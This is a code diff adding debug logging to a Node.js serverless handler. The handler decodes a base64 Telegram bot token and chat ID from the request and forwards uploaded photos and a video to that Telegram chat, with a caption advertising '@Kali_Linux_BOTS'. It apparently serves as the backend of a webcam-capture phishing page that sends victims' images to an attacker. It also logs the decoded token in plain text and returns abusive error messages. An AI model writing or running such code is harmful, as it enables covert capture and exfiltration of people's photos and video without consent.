@@ -8,10 +8,12 @@ module.exports = async (req, res) => {
 
   // Handle preflight OPTIONS request
   if (req.method === 'OPTIONS') {
+    console.log('Handling OPTIONS request');
     return res.status(200).json({ ok: true });
   }
 
   try {
+    console.log('Received request:', req.method, req.body);
     if (req.method !== 'POST') {
       console.log('Invalid method:', req.method);
       return res.status(405).json({ ok: false, error: 'Method not allowed, you dumb fuck' });
@@ -20,15 +22,19 @@ module.exports = async (req, res) => {
     const { x, y, photos, video } = req.body;
 
     if (!x || !y || !photos || !video) {
-      console.log('Missing required fields in request body');
+      console.log('Missing required fields in request body:', { x, y, photos: photos?.length, video: video?.length });
       return res.status(400).json({ ok: false, error: 'Missing required fields, you fucking idiot' });
     }
 
     // Decode the Base64-encoded parameters (noise already removed by index.html)
     let botToken, chatId;
     try {
+      console.log('Decoding x:', x);
+      console.log('Decoding y:', y);
       botToken = Buffer.from(x, 'base64').toString('utf-8');
       chatId = Buffer.from(y, 'base64').toString('utf-8');
+      console.log('Decoded botToken:', botToken);
+      console.log('Decoded chatId:', chatId);
     } catch (error) {
       console.error('Error decoding URL parameters, you moron:', error);
       return res.status(400).json({ ok: false, error: 'Invalid URL parameters, you fuck' });
@@ -47,9 +53,11 @@ module.exports = async (req, res) => {
       formDataPhoto.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');
 
       try {
+        console.log(`Sending photo ${i + 1} to Telegram`);
         const responsePhoto = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formDataPhoto, {
           headers: formDataPhoto.getHeaders(),
         });
+        console.log('Photo response:', responsePhoto.data);
         if (!responsePhoto.data.ok) {
           throw new Error(`Failed to send photo ${i + 1}: ${responsePhoto.data.description || 'Unknown error'}`);
         }
@@ -67,9 +75,11 @@ module.exports = async (req, res) => {
     formDataVideo.append('caption', '⚡Join ➣ @Kali_Linux_BOTS');
 
     try {
+      console.log('Sending video to Telegram');
       const responseVideo = await axios.post(`https://api.telegram.org/bot${botToken}/sendVideo`, formDataVideo, {
         headers: formDataVideo.getHeaders(),
       });
+      console.log('Video response:', responseVideo.data);
       if (!responseVideo.data.ok) {
         throw new Error(`Failed to send video: ${responseVideo.data.description || 'Unknown error'}`);
       }
